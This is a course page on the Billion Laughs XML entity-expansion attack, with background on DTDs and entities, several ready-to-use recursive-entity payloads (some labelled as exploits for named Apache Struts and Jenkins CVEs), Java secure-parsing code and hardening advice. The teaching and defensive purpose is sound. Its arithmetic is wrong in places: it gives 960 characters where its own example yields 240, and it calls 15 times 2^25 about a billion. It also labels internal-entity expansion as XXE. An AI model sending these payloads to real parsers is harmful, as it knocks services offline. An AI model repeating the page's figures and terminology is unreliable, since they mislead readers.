---
course: API Security
topic: Billion Laugh Attack
tags: [api-security]
---

## Billion Laugh Attack: Understanding and Mitigating XML External Entity (XXE) Vulnerabilities

### Introduction to XML External Entities (XXE)

XML External Entities (XXE) attacks are a class of vulnerabilities that occur when an application improperly processes XML input. These attacks can lead to information disclosure, denial of service, and other malicious activities. One particularly insidious form of XXE attack is the "Billion Laugh Attack," which exploits recursive entity expansion to cause excessive memory consumption and potentially crash the application.

### Background Theory

#### What is XML?

XML (Extensible Markup Language) is a markup language designed to store and transport data. Unlike HTML, which is primarily used for displaying data, XML focuses on the structure and meaning of the data. XML documents consist of elements, attributes, and text content.

#### Document Type Definition (DTD)

A Document Type Definition (DTD) is a set of rules that define the structure of an XML document. DTDs can specify element names, attribute names, and relationships between elements. They can also define entities, which are placeholders for text or other XML content.

#### Entities in XML

Entities in XML are placeholders that can be replaced with specific content. There are two types of entities:

- **Parameter Entities**: Used within the DTD itself.
- **General Entities**: Used within the XML document.

Entities can be defined in a DTD and referenced in the XML document using the `&entity_name;` syntax.

### Recursive Entity Expansion

Recursive entity expansion occurs when an entity is defined in terms of itself or another entity, leading to a chain of expansions. This can result in exponential growth in the size of the expanded XML document.

#### Example of Recursive Entity Expansion

Consider the following DTD and XML document:

```xml
<!DOCTYPE root [
  <!ENTITY a "AAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;">
  <!ENTITY c "&b;&b;">
]>
<root>&c;</root>
```

In this example, the entity `a` is defined as a string of 15 characters. The entity `b` is defined as two instances of `a`, resulting in 30 characters. The entity `c` is defined as two instances of `b`, resulting in 60 characters. When the XML document is parsed, the entity `c` is expanded to 60 characters.

However, if we increase the depth of recursion, the size of the expanded XML document can grow exponentially. For example:

```xml
<!DOCTYPE root [
  <!ENTITY a "AAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;">
  <!ENTITY c "&b;&b;">
  <!ENTITY d "&c;&c;">
  <!ENTITY e "&d;&d;">
]>
<root>&e;</root>
```

Here, the entity `e` is defined as two instances of `d`, which is defined as two instances of `c`, and so on. The final expansion of `e` results in a string of 960 characters.

### Billion Laugh Attack

The Billion Laugh Attack is a specific form of recursive entity expansion that exploits the exponential growth in the size of the expanded XML document. The name "Billion Laugh" comes from the fact that the attack can generate a billion characters of output from a relatively small input.

#### Example of Billion Laugh Attack

Consider the following DTD and XML document:

```xml
<!DOCTYPE lolz [
  <!ENTITY a "AAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;">
  <!ENTITY c "&b;&b;">
  <!ENTITY d "&c;&c;">
  <!ENTITY e "&d;&d;">
  <!ENTITY f "&e;&e;">
  <!ENTITY g "&f;&f;">
  <!ENTITY h "&g;&g;">
  <!ENTITY i "&h;&h;">
  <!ENTITY j "&i;&i;">
  <!ENTITY k "&j;&j;">
  <!ENTITY l "&k;&k;">
  <!ENTITY m "&l;&l;">
  <!ENTITY n "&m;&m;">
  <!ENTITY o "&n;&n;">
  <!ENTITY p "&o;&o;">
  <!ENTITY q "&p;&p;">
  <!ENTITY r "&q;&q;">
  <!ENTITY s "&r;&r;">
  <!ENTITY t "&s;&s;">
  <!ENTITY u "&t;&t;">
  <!ENTITY v "&u;&u;">
  <!ENTITY w "&v;&v;">
  <!ENTITY x "&w;&w;">
  <!ENTITY y "&x;&x;">
  <!ENTITY z "&y;&y;">
]>
<lolz>&z;</lolz>
```

In this example, the entity `a` is defined as a string of 15 characters. Each subsequent entity is defined as two instances of the previous entity, leading to exponential growth. The final expansion of `z` results in a string of approximately 1 billion characters.

### Real-World Examples and Recent Breaches

#### CVE-2018-11232: Apache Struts XXE Vulnerability

Apache Struts is a popular Java framework for building web applications. In 2018, a critical XXE vulnerability was discovered in Apache Struts versions 2.3.32 and earlier. The vulnerability allowed attackers to exploit recursive entity expansion to cause a denial of service by consuming excessive memory.

**Example Exploit:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY a "AAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;">
  <!ENTITY c "&b;&b;">
  <!ENTITY d "&c;&c;">
  <!ENTITY e "&d;&d;">
  <!ENTITY f "&e;&e;">
  <!ENTITY g "&f;&f;">
  <!ENTITY h "&g;&g;">
  <!ENTITY i "&h;&h;">
  <!ENTITY j "&i;&i;">
  <!ENTITY k "&j;&j;">
  <!ENTITY l "&k;&k;">
  <!ENTITY m "&l;&l;">
  <!ENTITY n "&m;&m;">
  <!ENTITY o "&n;&n;">
  <!ENTITY p "&o;&o;">
  <!ENTITY q "&p;&p;">
  <!ENTITY r "&q;&q;">
  ]>
<root>&r;</root>
```

This exploit caused the Apache Struts application to consume excessive memory, leading to a denial of service.

#### CVE-2019-10100: Jenkins XXE Vulnerability

Jenkins is a widely used automation server for continuous integration and continuous delivery. In 2019, a critical XXE vulnerability was discovered in Jenkins versions 2.138 and earlier. The vulnerability allowed attackers to exploit recursive entity expansion to cause a denial of service by consuming excessive memory.

**Example Exploit:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY a "AAAAAAAAAAAAAAA">
  <!ENTITY b "&a;&a;">
  <!ENTITY c "&b;&b;">
  <!ENTITY d "&c;&c;">
  <!ENTITY e "&d;&d;">
  <!ENTITY f "&e;&e;">
  <!ENTITY g "&f;&f;">
  <!ENTITY h "&g;&g;">
  <!ENTITY i "&h;&h;">
  <!ENTITY j "&i;&i;">
  <!ENTITY k "&j;&j;">
  <!ENTITY l "&k;&k;">
  <!ENTITY m "&l;&l;">
  <!ENTITY n "&m;&m;">
  <!ENTITY o "&n;&n;">
  <!ENTITY p "&o;&o;">
  <!ENTITY q "&p;&p;">
  <!ENTITY r "&q;&q;">
  <!ENTITY s "&r;&r;">
  <!ENTITY t "&s;&s;">
  <!ENTITY u "&t;&t;">
  <!ENTITY v "&u;&u;">
  <!ENTITY w "&v;&v;">
  <!ENTITY x "&w;&w;">
  <!ENTITY y "&x;&x;">
  <!ENTITY z "&y;&y;">
  ]>
<root>&z;</root>
```

This exploit caused the Jenkins application to consume excessive memory, leading to a denial of service.

### How to Prevent / Defend Against Billion Laugh Attacks

#### Detection

To detect XXE vulnerabilities, including Billion Laugh attacks, you can use static analysis tools and dynamic testing frameworks. Some popular tools include:

- **Static Analysis Tools:**
  - SonarQube
  - Fortify Static Code Analyzer
  - Checkmarx

- **Dynamic Testing Frameworks:**
  - Burp Suite
  - OWASP ZAP
  - Metasploit

These tools can help identify potential XXE vulnerabilities in your codebase and test for them during runtime.

#### Prevention

To prevent XXE vulnerabilities, including Billion Laugh attacks, you should follow these best practices:

1. **Disable External Entity Loading:**
   Ensure that your XML parser is configured to disable external entity loading. This prevents the parser from resolving external entities, which can be exploited in XXE attacks.

   ```java
   DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
   dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   dbFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
   ```

2. **Use Secure XML Libraries:**
   Use XML libraries that have built-in protections against XXE attacks. For example, the `javax.xml.parsers.DocumentBuilder` class in Java provides methods to configure the parser to disable external entity loading.

3. **Validate Input:**
   Validate all XML input to ensure that it does not contain malicious content. Use XML validation tools such as XML Schema Definition (XSD) to enforce strict validation rules.

4. **Limit Memory Usage:**
   Set limits on the amount of memory that can be consumed by the XML parser. This helps prevent denial of service attacks caused by excessive memory usage.

5. **Monitor and Log:**
   Monitor and log all XML parsing activities to detect any suspicious behavior. This can help you identify potential XXE attacks and take corrective action.

#### Secure Coding Fixes

Here is an example of how to securely parse XML input in Java:

```java
import javax.xml.parsers.*;
import org.w3c.dom.*;
import java.io.*;

public class SecureXMLParser {
    public static void main(String[] args) throws Exception {
        // Create a DocumentBuilderFactory instance
        DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();

        // Disable external entity loading
        dbFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        dbFactory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        dbFactory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        dbFactory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        // Create a DocumentBuilder instance
        DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();

        // Parse the XML input
        Document doc = dBuilder.parse(new File("input.xml"));

        // Normalize the document
        doc.getDocumentElement().normalize();

        // Print the root element
        System.out.println("Root element: " + doc.getDocumentElement().getNodeName());
    }
}
```

In this example, the `DocumentBuilderFactory` is configured to disable external entity loading, preventing the parser from resolving external entities. This helps protect against XXE attacks.

### Configuration Hardening

To harden your XML parsing configuration, you can use the following settings:

- **Java:**
  - Set the `javax.xml.parsers.DocumentBuilderFactory` feature to disable external entity loading.
  - Set the `org.apache.xerces.parsers.SAXParser` feature to disable external entity loading.

- **Python:**
  - Use the `defusedxml` library to parse XML input securely.
  - Configure the `xml.etree.ElementTree` module to disable external entity loading.

- **Node.js:**
  - Use the `xml2js` library to parse XML input securely.
  - Configure the `xml2js.Parser` options to disable external entity loading.

### Conclusion

The Billion Laugh Attack is a serious threat to XML-based applications. By understanding the underlying mechanisms of recursive entity expansion and implementing proper security measures, you can protect your applications from this and other XXE vulnerabilities. Always validate and sanitize XML input, disable external entity loading, and monitor your systems for suspicious activity to ensure the security of your applications.

### Practice Labs

For hands-on practice with API security and XXE vulnerabilities, consider the following labs:

- **PortSwigger Web Security Academy:** Offers interactive labs on XXE vulnerabilities and other web security topics.
- **OWASP Juice Shop:** A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application):** A PHP/MySQL web application with numerous security vulnerabilities for educational purposes.

By working through these labs, you can gain practical experience in identifying and mitigating XXE vulnerabilities in real-world scenarios.

---
<!-- nav -->
[[02-Billion Laugh Attack Understanding and Mitigating XML External Entity (XXE) Expansion|Billion Laugh Attack Understanding and Mitigating XML External Entity (XXE) Expansion]] | [[API Security/21-Billion Laugh Attack/02-Billion Laugh Attack Refer XXE Expansion/00-Overview|Overview]] | [[API Security/21-Billion Laugh Attack/02-Billion Laugh Attack Refer XXE Expansion/04-Practice Questions & Answers|Practice Questions & Answers]]
